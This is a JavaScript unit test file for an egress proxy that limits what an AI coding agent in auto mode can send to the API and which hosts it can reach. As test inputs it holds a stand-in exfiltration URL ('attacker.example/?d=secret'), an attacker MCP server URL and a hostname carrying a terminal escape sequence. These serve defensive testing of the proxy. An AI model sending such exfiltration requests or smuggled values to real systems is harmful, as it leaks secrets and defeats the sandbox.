// Unit tests for the auto-mode egress proxy (bin/ccc-auto-proxy.js), against a
// stub API server, so no real API calls are made. Run them in the ccc image:
//
//   docker run --rm -v "$PWD:/src:ro" -w /src --entrypoint node ccc --test 'test/*.test.js'
'use strict';
const { test, before, beforeEach, after } = require('node:test');
const assert = require('node:assert/strict');
const http = require('node:http');
const net = require('node:net');
const { createProxy, hostAllowed } = require('../bin/ccc-auto-proxy.js');

let upstream, proxy, received, logs;
const listen = server => new Promise(resolve => server.listen(0, '127.0.0.1', resolve));

before(async () => {
  upstream = http.createServer((req, res) => {
    let body = '';
    req.on('data', d => { body += d; }).on('end', () => {
      received.push({ method: req.method, url: req.url, headers: req.headers, body });
      res.writeHead(201, { 'content-type': 'text/event-stream' });
      res.end('data: from-upstream\n\n');
    });
  });
  await listen(upstream);
  proxy = createProxy({
    apiKey: 'real-key',
    allowHosts: ['allowed.example', '*.wild.example'],
    upstream: `http://127.0.0.1:${upstream.address().port}`,
    log: line => logs.push(line),
  });
  await listen(proxy);
});
after(() => { proxy.close(); upstream.close(); });
beforeEach(() => { received = []; logs = []; });

// Send a request to the proxy the way the agent does (origin-form path).
function send(method, path, body, headers = {}) {
  return new Promise((resolve, reject) => {
    const req = http.request({
      host: '127.0.0.1', port: proxy.address().port, method, path,
      headers: { 'content-type': 'application/json', ...headers },
    }, res => {
      let data = '';
      res.on('data', d => { data += d; }).on('end', () => resolve({ status: res.statusCode, headers: res.headers, body: data }));
    });
    req.on('error', reject);
    req.end(body);
  });
}

// Send a raw request head and return the proxy's status line.
function raw(head) {
  return new Promise((resolve, reject) => {
    const sock = net.connect(proxy.address().port, '127.0.0.1', () => sock.write(head));
    let data = '';
    sock.on('data', d => { data += d; if (data.includes('\r\n')) { sock.destroy(); resolve(data.split('\r\n')[0]); } });
    sock.on('error', reject);
  });
}
const connect = target => raw(`CONNECT ${target} HTTP/1.1\r\nHost: ${target}\r\n\r\n`);

const message = extra => JSON.stringify({ model: 'm', max_tokens: 1, messages: [{ role: 'user', content: 'hi' }], ...extra });

test('hostAllowed matches exact names and *.suffix wildcards only', () => {
  const patterns = ['a.example', '*.b.example'];
  assert.equal(hostAllowed('a.example', patterns), true);
  assert.equal(hostAllowed('A.Example.', patterns), true);
  assert.equal(hostAllowed('x.a.example', patterns), false);
  assert.equal(hostAllowed('x.b.example', patterns), true);
  assert.equal(hostAllowed('y.x.b.example', patterns), true);
  assert.equal(hostAllowed('b.example', patterns), false);
  assert.equal(hostAllowed('evilb.example', patterns), false);
  assert.equal(hostAllowed('a.example.evil', patterns), false);
});

test('forwards messages to the API with the real key in place of the agent\'s', async () => {
  const body = message();
  const res = await send('POST', '/v1/messages?beta=true', body, {
    authorization: 'Bearer placeholder', 'x-api-key': 'agent-key', 'anthropic-version': '2023-06-01',
  });
  assert.equal(res.status, 201);
  assert.equal(res.body, 'data: from-upstream\n\n');
  assert.equal(received.length, 1);
  const got = received[0];
  assert.equal(got.method, 'POST');
  assert.equal(got.url, '/v1/messages?beta=true');
  assert.equal(got.headers['x-api-key'], 'real-key');
  assert.equal(got.headers.authorization, undefined);
  assert.equal(got.headers['anthropic-version'], '2023-06-01');
  assert.deepEqual(JSON.parse(got.body), JSON.parse(body));
});

test('forwards token counting', async () => {
  const res = await send('POST', '/v1/messages/count_tokens?beta=true', message());
  assert.equal(res.status, 201);
  assert.equal(received.length, 1);
});

test('refuses other API paths and methods without calling the API', async () => {
  for (const [method, path] of [['GET', '/v1/models'], ['POST', '/v1/files'], ['GET', '/v1/messages'], ['POST', '/v1/messages/batches']]) {
    const res = await send(method, path, method === 'POST' ? message() : undefined);
    assert.equal(res.status, 403, `${method} ${path}`);
  }
  assert.equal(received.length, 0);
});

test('refuses requests that would make the API fetch a URL', async () => {
  const urlSource = { type: 'url', url: 'https://attacker.example/?d=secret' };
  const bodies = {
    'MCP connector': message({ mcp_servers: [{ type: 'url', url: 'https://attacker.example/mcp', name: 'x' }] }),
    'web fetch tool': message({ tools: [{ type: 'web_fetch_20250910', name: 'web_fetch' }] }),
    'URL image': message({ messages: [{ role: 'user', content: [{ type: 'image', source: urlSource }] }] }),
    'URL document in a tool result': message({ messages: [{ role: 'user', content: [
      { type: 'tool_result', tool_use_id: 't', content: [{ type: 'document', source: urlSource }] }] }] }),
  };
  for (const [name, body] of Object.entries(bodies)) {
    const res = await send('POST', '/v1/messages', body);
    assert.equal(res.status, 403, name);
  }
  assert.equal(received.length, 0);
});

test('forwards the body it checked, not the agent\'s bytes', async () => {
  // With duplicate keys, a parser that keeps the first one would see the web
  // fetch tool that JSON.parse (last one wins) doesn't.
  const body = '{"model":"m","tools":[{"type":"web_fetch_20250910","name":"web_fetch"}],"tools":[]}';
  const res = await send('POST', '/v1/messages', body);
  assert.equal(res.status, 201);
  assert.equal(received[0].body, '{"model":"m","tools":[]}');
});

test('refuses bodies it can\'t check', async () => {
  assert.equal((await send('POST', '/v1/messages', '{not json')).status, 400);
  assert.equal((await send('POST', '/v1/messages', message(), { 'content-encoding': 'gzip' })).status, 415);
  assert.equal(received.length, 0);
});

test('refuses plain HTTP proxy requests', async () => {
  assert.match(await raw('GET http://allowed.example/ HTTP/1.1\r\nHost: allowed.example\r\n\r\n'), / 403 /);
});

test('tunnels only to allowed hosts on port 443', async () => {
  assert.match(await connect('evil.example:443'), / 403 /);
  assert.match(await connect('allowed.example:80'), / 403 /);
  assert.match(await connect('x.allowed.example:443'), / 403 /);
  assert.match(await connect('1.2.3.4:443'), / 403 /);
  // Allowed: the proxy tries to connect, which fails here since .example
  // names don't resolve.
  assert.match(await connect('allowed.example:443'), / 502 /);
  assert.match(await connect('api.wild.example:443'), / 502 /);
});

test('logs each decision with printable characters only', async () => {
  await connect('evil.example:443');
  await send('POST', '/v1/messages', message());
  await connect('evil\x1b[2J.example:443');
  assert.ok(logs.some(l => /^deny CONNECT evil\.example:443/.test(l)), logs.join('\n'));
  assert.ok(logs.some(l => /^allow POST \/v1\/messages 201/.test(l)), logs.join('\n'));
  assert.ok(logs.every(l => /^[\x20-\x7e]*$/.test(l)), logs.join('\n'));
});
